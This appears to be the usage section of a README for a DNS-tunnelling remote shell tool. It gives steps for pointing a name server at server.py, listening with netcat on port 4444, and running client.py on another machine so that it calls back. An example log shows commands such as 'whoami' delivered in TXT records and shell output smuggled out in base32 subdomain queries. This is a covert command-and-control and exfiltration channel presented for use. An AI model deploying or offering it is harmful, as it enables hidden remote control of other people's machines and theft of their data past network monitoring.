Usage
Create an NS record that will point to where ever server.py is running; will need to be reachable on UDP 53
send    NS     1H      example.com.

Update INPUTDOMAIN in client/server code to your own DNS name server.

Run server.py on your machine
Connect to it with netcat (ncport defaults to 4444) to send and receive traffic.
>nc 127.0.0.1 4444

Run client.py on another machine and it will call out to server.py

That's it.

The responses are base32 encoded in the subdomains and the commands are in the TXT record responses to those queries.

Example:

[Incoming DNS Query] jvuwg4tponxwm5bak5uw4zdpo5zsaw2wmvzhg2lpnyqdcmbogaxdcojqgqzc4ob.ugroq2crimmusamrqgiycatljmnzg643pmz2caq3pojyg64tboruw63roebawy.3baojuwo2duomqhezltmvzhmzlefygqudik.send.example.com
[Response] ['ACK'] 
[Incoming DNS Query] send.example.com
[Response] ['ACK'] 
[Incoming DNS Query] send.example.com
[Response] ['d2hvYW1pCg=='] 
[Incoming DNS Query] im5fyvltmvzhgxdsmv4wc3dtlrzw65lsmnsvy4tfobxxgxcsmv3gk4ttmuwvg2d.fnrwc233wmvzc2rcokmww65tfoiwuqvcukbjt453in5qw22ikojsxsylmomww2.yltorsxe4ddlrzgk6lbnrzq2cqnbi.send.example.com
[Response] ['ACK'] 
[Incoming DNS Query] send.example.com